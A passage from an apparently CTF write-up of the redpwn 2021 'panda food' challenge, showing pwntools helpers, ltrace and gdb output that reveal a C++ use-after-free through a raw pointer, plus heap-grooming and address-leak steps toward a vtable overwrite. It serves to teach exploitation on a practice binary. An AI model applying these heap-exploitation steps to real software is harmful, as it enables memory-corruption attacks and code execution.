+</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=nb>all</span><span class=p>(</span><span class=n>c</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>whitespace</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span> <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>name</span><span class=p>)</span> <span class=c1># whitespace will cause cin to terminate. This necessarily means that some ASLR bytes can kill an exploit.</span>
+</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=nb>len</span><span class=p>(</span><span class=n>name</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mh>0x1000</span>
+</span></span><span class=line><span class=cl>    <span class=n>choose</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sendidx</span><span class=p>(</span><span class=n>idx</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>name</span><span class=p>)</span> <span class=c1># io speed: r.sendlineafter(&#39;name: \n&#39;, name)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>fav</span><span class=p>(</span><span class=n>idx</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>choose</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sendidx</span><span class=p>(</span><span class=n>idx</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>printName</span><span class=p>()</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>choose</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>flush</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;name: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>(</span><span class=n>timeout</span><span class=o>=</span><span class=mi>1</span><span class=p>)[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>Eat</span><span class=p>():</span> <span class=n>choose</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=exploring>Exploring</h2><p>Looking at the code, although I&rsquo;m unable to spot the obvious bug for a lack of experience, I manage to identify a few oddities:</p><ul><li><code>Bamboo</code>&rsquo;s constructor uses <code>string&&</code>; <code>Food</code> uses <code>string</code>. I know that <code>&</code> means &ldquo;pass by reference&rdquo;, so only one of the two constructors will allocate and duplicate an entire <code>string</code>. The random nature of Food vs Bamboo probably complicates the exploit to make fuzzing a bit harder.</li><li><code>unique_ptr&lt;Bamboo></code> gets casted away into <code>unique_ptr&lt;Food></code>, and <code>unique_ptr&lt;Food></code> can get casted into a <code>Food*</code> in <code>favorite</code>.</li><li>there&rsquo;s an obvious need to overwrite virtual function <code>Eat()</code> with a `one_gadget``</li></ul><p>I figure I need a better understanding of the C++ types used here, so I begin to search.</p><h3 id=stdgoogle><code>std::google</code></h3><p>The first thing I search for is <a href=https://en.cppreference.com/w/cpp/utility/move target=_blank rel="noopener noreffer"><code>std::move</code></a>. It seems to magically move around memory references somehow, invalidating the argument passed to <code>move(...)</code>. That&rsquo;s interesting from a programmatic perspective, but I don&rsquo;t really understand how it&rsquo;ll be relevant for the pwn.</p><p>I search for <a href=https://en.cppreference.com/w/cpp/memory/unique_ptr/make_unique target=_blank rel="noopener noreffer"><code>std::make_unique</code></a> next. It returns a <a href=https://en.cppreference.com/w/cpp/memory/unique_ptr target=_blank rel="noopener noreffer"><code>std::unique_ptr</code></a>, so I search for that too. With a little bit of reading, I figure out that I&rsquo;ve actually heard of <code>unique_ptr</code>s before, under a different name: <a href=https://docs.microsoft.com/en-us/cpp/cpp/smart-pointers-modern-cpp target=_blank rel="noopener noreffer">smart pointers</a>. The example at the link makes them really easy to understand:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/blog/redpwn-2021-panda-food/image-20210711100648195.png data-srcset="/blog/redpwn-2021-panda-food/image-20210711100648195.png, /blog/redpwn-2021-panda-food/image-20210711100648195.png 1.5x, /blog/redpwn-2021-panda-food/image-20210711100648195.png 2x" data-sizes=auto alt=/blog/redpwn-2021-panda-food/image-20210711100648195.png title=/blog/redpwn-2021-panda-food/image-20210711100648195.png width=1013 height=614></p><p>A <code>unique_ptr</code> will be deleted (freed) when it goes &ldquo;out of scope&rdquo;. In the case of the current program, there&rsquo;s a <code>unique_ptr&lt;Food> tmp</code> scoped to <code>case 0</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=k>case</span> <span class=mi>0</span><span class=o>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=n>size_t</span> <span class=n>idx</span> <span class=o>=</span> <span class=n>get_idx</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>unique_ptr</span><span class=o>&lt;</span><span class=n>Food</span><span class=o>&gt;</span> <span class=n>tmp</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>name</span><span class=p>.</span><span class=n>length</span><span class=p>()</span> <span class=o>&gt;</span> <span class=mh>0x1000</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;too big :/&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>_Exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>rand64</span><span class=p>()</span> <span class=o>%</span> <span class=mi>2</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span> <span class=n>tmp</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=n>make_unique</span><span class=o>&lt;</span><span class=n>Bamboo</span><span class=o>&gt;</span><span class=p>(</span><span class=n>std</span><span class=o>::</span><span class=n>move</span><span class=p>(</span><span class=n>name</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=n>tmp</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=n>make_unique</span><span class=o>&lt;</span><span class=n>Food</span><span class=o>&gt;</span><span class=p>(</span><span class=n>std</span><span class=o>::</span><span class=n>move</span><span class=p>(</span><span class=n>name</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>    <span class=n>foods</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=n>move</span><span class=p>(</span><span class=n>tmp</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span> <span class=c1>// tmp is deleted automatically here?
+</span></span></span></code></pre></td></tr></table></div></div><p>In this case, <code>tmp</code> <em>isn&rsquo;t</em> freed after breaking from <code>case 0</code>, which I can demonstrate readily with <code>ltrace</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>$ ltrace ./chall 2&gt;<span class=p>&amp;</span><span class=m>1</span> <span class=p>|</span> grep -e malloc -e free -e fwrite
+</span></span><span class=line><span class=cl>malloc<span class=o>(</span>72704<span class=o>)</span>                                    <span class=o>=</span> 0x7fffd2069010
+</span></span><span class=line><span class=cl>fwrite<span class=o>(</span><span class=s2>&#34;choice: &#34;</span>, 1, 8, 0x7fcd0e4ea600<span class=o>)</span>         <span class=o>=</span> <span class=m>8</span>
+</span></span><span class=line><span class=cl><span class=m>0</span>
+</span></span><span class=line><span class=cl>fwrite<span class=o>(</span><span class=s2>&#34;idx: &#34;</span>, 1, 5, 0x7fcd0e4ea600<span class=o>)</span>            <span class=o>=</span> <span class=m>5</span>
+</span></span><span class=line><span class=cl><span class=m>0</span>
+</span></span><span class=line><span class=cl>fwrite<span class=o>(</span><span class=s2>&#34;name: &#34;</span>, 1, 6, 0x7fcd0e4ea600<span class=o>)</span>           <span class=o>=</span> <span class=m>6</span>
+</span></span><span class=line><span class=cl>hiii
+</span></span><span class=line><span class=cl>malloc<span class=o>(</span>40<span class=o>)</span>                                       <span class=o>=</span> 0x7fffd207be40
+</span></span><span class=line><span class=cl>malloc<span class=o>(</span>48<span class=o>)</span>                                       <span class=o>=</span> 0x7fffd207be70
+</span></span></code></pre></td></tr></table></div></div><p>Over here, I&rsquo;ve allocated a <code>unique_ptr&lt;Food></code> to <code>foods[0]</code>. <code>std::move</code> effectively &ldquo;transfers ownership&rdquo;<sup>2</sup> of the smart pointer to <code>foods[]</code>. If I repeat that allocation,</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=n>fwrite</span><span class=p>(</span><span class=s>&#34;choice: &#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>8</span><span class=p>,</span> <span class=mh>0x7fcd0e4ea600</span><span class=p>)</span>         <span class=o>=</span> <span class=mi>8</span>
+</span></span><span class=line><span class=cl><span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=n>fwrite</span><span class=p>(</span><span class=s>&#34;idx: &#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>5</span><span class=p>,</span> <span class=mh>0x7fcd0e4ea600</span><span class=p>)</span>            <span class=o>=</span> <span class=mi>5</span>
+</span></span><span class=line><span class=cl><span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=n>fwrite</span><span class=p>(</span><span class=s>&#34;name: &#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>6</span><span class=p>,</span> <span class=mh>0x7fcd0e4ea600</span><span class=p>)</span>           <span class=o>=</span> <span class=mi>6</span>
+</span></span><span class=line><span class=cl><span class=n>heyagain</span>
+</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mi>40</span><span class=p>)</span>                                       <span class=o>=</span> <span class=mh>0x7fffd207beb0</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mh>0x7fffd207be40</span><span class=p>)</span>                             <span class=o>=</span> <span class=o>&lt;</span><span class=kt>void</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl><span class=n>fwrite</span><span class=p>(</span><span class=s>&#34;choice: &#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>8</span><span class=p>,</span> <span class=mh>0x7fcd0e4ea600</span><span class=p>)</span>         <span class=o>=</span> <span class=mi>8</span>
+</span></span></code></pre></td></tr></table></div></div><p>A <code>free()</code> <em>does</em> happen this time, because when a <em>new</em> <code>unique_ptr</code> is assigned to <code>foods[0]</code>, the pointer that already existed at <code>foods[0]</code> understands that there are no references left to it (that it has gone out of scope), causing it to delete itself.</p><p>At this point, I get a flash of insight as I discover what the main bug is: <code>favorite</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=k>case</span> <span class=mi>1</span><span class=o>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=n>size_t</span> <span class=n>idx</span> <span class=o>=</span> <span class=n>get_idx</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>  <span class=n>favorite</span> <span class=o>=</span> <span class=n>foods</span><span class=p>[</span><span class=n>idx</span><span class=p>].</span><span class=n>get</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>  <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>favorite</code> is a normal &ldquo;dumb&rdquo; pointer. A <code>unique_ptr</code> from <code>foods[]</code> can&rsquo;t keep track of <code>favorites</code>, and when the <code>unique_ptr</code> associated with <code>favorites</code> is freed, a dangling pointer is left in <code>favorites</code>, causing a <strong>use after free</strong>.</p><h3 id=testing-the-uaf>Testing the UAF</h3><p>I start with a little bit of experimentation:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x47</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;b&#39;</span><span class=o>*</span><span class=mh>0x47</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;c&#39;</span><span class=o>*</span><span class=mh>0x47</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>fav</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mh>0x17</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;B&#39;</span><span class=o>*</span><span class=mh>0x17</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;C&#39;</span><span class=o>*</span><span class=mh>0x17</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>printName</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>My hope here is that, in using allocations of different sizes, the merging and reallocation<sup>3</sup> of a freed <code>foods[2]</code> will lead to one of the input strings overwriting <code>*favorites</code>.</p><p>The code above produces a crash <em>sometimes</em><sup>4</sup>; here&rsquo;s one possible variant of a crash, where the contents of <code>favorite</code> are overwritten with the string data of the 2nd re-allocation:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>(gdb) telescope favorite
+</span></span><span class=line><span class=cl>0x00007ffff76da1c0│+0x0000: &#34;BBBBBBBBBBBBBBBBBBBBBBB&#34;
+</span></span><span class=line><span class=cl>0x00007ffff76da1c8│+0x0008: &#34;BBBBBBBBBBBBBBB&#34;
+</span></span><span class=line><span class=cl>0x00007ffff76da1d0│+0x0010: 0x0042424242424242 (&#34;BBBBBBB&#34;?)
+</span></span><span class=line><span class=cl>0x00007ffff76da1d8│+0x0018: 0x000000000000003c (&#34;&lt;&#34;?)
+</span></span><span class=line><span class=cl>0x00007ffff76da1e0│+0x0020: 0x0000000000000000
+</span></span><span class=line><span class=cl>0x00007ffff76da1e8│+0x0028: 0x0000000000000051 (&#34;Q&#34;?)
+</span></span><span class=line><span class=cl>0x00007ffff76da1f0│+0x0030: 0x0000000000000000
+</span></span><span class=line><span class=cl>0x00007ffff76da1f8│+0x0038: &#34;ccccccccccccccccccccccccccccccccccccccccccccccc&#34;
+</span></span><span class=line><span class=cl>0x00007ffff76da200│+0x0040: &#34;ccccccccccccccccccccccccccccccccccccccc&#34;
+</span></span><span class=line><span class=cl>0x00007ffff76da208│+0x0048: &#34;ccccccccccccccccccccccccccccccc&#34;
+</span></span></code></pre></td></tr></table></div></div><p>At this point, it might be helpful to describe my approximation of how <code>Food</code>/<code>Bamboo</code> is represented in memory:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=k>struct</span> <span class=nc>Food</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=kt>void</span> <span class=o>**</span><span class=n>_vtable</span><span class=p>;</span> <span class=c1>// _vtable[0] == Eat()
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>basic_string</span> <span class=n>name_</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=nc>basic_string</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>union</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>struct</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=kt>char</span> <span class=o>*</span><span class=n>p</span><span class=p>;</span> <span class=c1>// when capacity&gt;0xf, p holds a pointer to the actual bytes of the string data.
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=n>size_t</span> <span class=n>size</span><span class=p>;</span> <span class=c1>// don&#39;t really know what happens to this for capacity &lt; 0x10
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=p>}</span> 
+</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mh>0x10</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=n>size_t</span> <span class=n>capacity</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span> <span class=c1>// sizeof(basic_string) == 0x20
+</span></span></span></code></pre></td></tr></table></div></div><p>The invalid <code>favorite</code> struct has <code>favorite->name_.p</code> pointing to <code>0x4242424242424242</code>, which necessarily causes a segfault when dereferenced. If I change <code>b'B'*0x17</code> in my exploit code to <code>fit({8: pack(ptr)})+b'B'*7</code>, I&rsquo;ll be able to leak the contents of <code>ptr</code>.</p><p>The conditions are not favorable:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>Start</span>              <span class=n>End</span>                <span class=n>Offset</span>             <span class=n>Perm</span> <span class=n>Path</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00005576017e3000</span> <span class=mh>0x00005576018ca000</span> <span class=mh>0x0000000000000000</span> <span class=n>r</span><span class=o>-</span><span class=n>x</span> <span class=n>chall</span>
+</span></span><span class=line><span class=cl><span class=mh>0x0000557601ac9000</span> <span class=mh>0x0000557601ad1000</span> <span class=mh>0x00000000000e6000</span> <span class=n>r</span><span class=o>--</span> <span class=n>chall</span>
+</span></span><span class=line><span class=cl><span class=mh>0x0000557601ad1000</span> <span class=mh>0x0000557601ad2000</span> <span class=mh>0x00000000000ee000</span> <span class=n>rw</span><span class=o>-</span> <span class=n>chall</span>
+</span></span><span class=line><span class=cl><span class=mh>0x0000557601ad2000</span> <span class=mh>0x0000557601ad5000</span> <span class=mh>0x0000000000000000</span> <span class=n>rw</span><span class=o>-</span>
+</span></span><span class=line><span class=cl><span class=mh>0x0000557603514000</span> <span class=mh>0x0000557603535000</span> <span class=mh>0x0000000000000000</span> <span class=n>rw</span><span class=o>-</span> <span class=p>[</span><span class=n>heap</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007f2678706000</span> <span class=mh>0x00007f2678709000</span> <span class=mh>0x0000000000000000</span> <span class=n>rw</span><span class=o>-</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007f2678709000</span> <span class=mh>0x00007f267872e000</span> <span class=mh>0x0000000000000000</span> <span class=n>r</span><span class=o>--</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>x86_64</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>gnu</span><span class=o>/</span><span class=n>libc</span><span class=o>-</span><span class=mf>2.31</span><span class=o>.</span><span class=n>so</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007f267872e000</span> <span class=mh>0x00007f26788a6000</span> <span class=mh>0x0000000000025000</span> <span class=n>r</span><span class=o>-</span><span class=n>x</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>x86_64</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>gnu</span><span class=o>/</span><span class=n>libc</span><span class=o>-</span><span class=mf>2.31</span><span class=o>.</span><span class=n>so</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007f26788a6000</span> <span class=mh>0x00007f26788f0000</span> <span class=mh>0x000000000019d000</span> <span class=n>r</span><span class=o>--</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>x86_64</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>gnu</span><span class=o>/</span><span class=n>libc</span><span class=o>-</span><span class=mf>2.31</span><span class=o>.</span><span class=n>so</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007f26788f0000</span> <span class=mh>0x00007f26788f1000</span> <span class=mh>0x00000000001e7000</span> <span class=o>---</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>x86_64</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>gnu</span><span class=o>/</span><span class=n>libc</span><span class=o>-</span><span class=mf>2.31</span><span class=o>.</span><span class=n>so</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007f26788f1000</span> <span class=mh>0x00007f26788f4000</span> <span class=mh>0x00000000001e7000</span> <span class=n>r</span><span class=o>--</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>x86_64</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>gnu</span><span class=o>/</span><span class=n>libc</span><span class=o>-</span><span class=mf>2.31</span><span class=o>.</span><span class=n>so</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007f26788f4000</span> <span class=mh>0x00007f26788f7000</span> <span class=mh>0x00000000001ea000</span> <span class=n>rw</span><span class=o>-</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>x86_64</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>gnu</span><span class=o>/</span><span class=n>libc</span><span class=o>-</span><span class=mf>2.31</span><span class=o>.</span><span class=n>so</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007f26788f7000</span> <span class=mh>0x00007f26788fb000</span> <span class=mh>0x0000000000000000</span> <span class=n>rw</span><span class=o>-</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007f26788fb000</span> <span class=mh>0x00007f267890a000</span> <span class=mh>0x0000000000000000</span> <span class=n>r</span><span class=o>--</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>x86_64</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>gnu</span><span class=o>/</span><span class=n>libm</span><span class=o>-</span><span class=mf>2.31</span><span class=o>.</span><span class=n>so</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007f267890a000</span> <span class=mh>0x00007f26789b1000</span> <span class=mh>0x000000000000f000</span> <span class=n>r</span><span class=o>-</span><span class=n>x</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>x86_64</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>gnu</span><span class=o>/</span><span class=n>libm</span><span class=o>-</span><span class=mf>2.31</span><span class=o>.</span><span class=n>so</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007f26789b1000</span> <span class=mh>0x00007f2678a48000</span> <span class=mh>0x00000000000b6000</span> <span class=n>r</span><span class=o>--</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>x86_64</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>gnu</span><span class=o>/</span><span class=n>libm</span><span class=o>-</span><span class=mf>2.31</span><span class=o>.</span><span class=n>so</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007f2678a48000</span> <span class=mh>0x00007f2678a49000</span> <span class=mh>0x000000000014c000</span> <span class=n>r</span><span class=o>--</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>x86_64</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>gnu</span><span class=o>/</span><span class=n>libm</span><span class=o>-</span><span class=mf>2.31</span><span class=o>.</span><span class=n>so</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007f2678a49000</span> <span class=mh>0x00007f2678a4a000</span> <span class=mh>0x000000000014d000</span> <span class=n>rw</span><span class=o>-</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>x86_64</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>gnu</span><span class=o>/</span><span class=n>libm</span><span class=o>-</span><span class=mf>2.31</span><span class=o>.</span><span class=n>so</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007f2678a4a000</span> <span class=mh>0x00007f2678a4c000</span> <span class=mh>0x0000000000000000</span> <span class=n>rw</span><span class=o>-</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007f2678a62000</span> <span class=mh>0x00007f2678a63000</span> <span class=mh>0x0000000000000000</span> <span class=n>r</span><span class=o>--</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>x86_64</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>gnu</span><span class=o>/</span><span class=n>ld</span><span class=o>-</span><span class=mf>2.31</span><span class=o>.</span><span class=n>so</span>
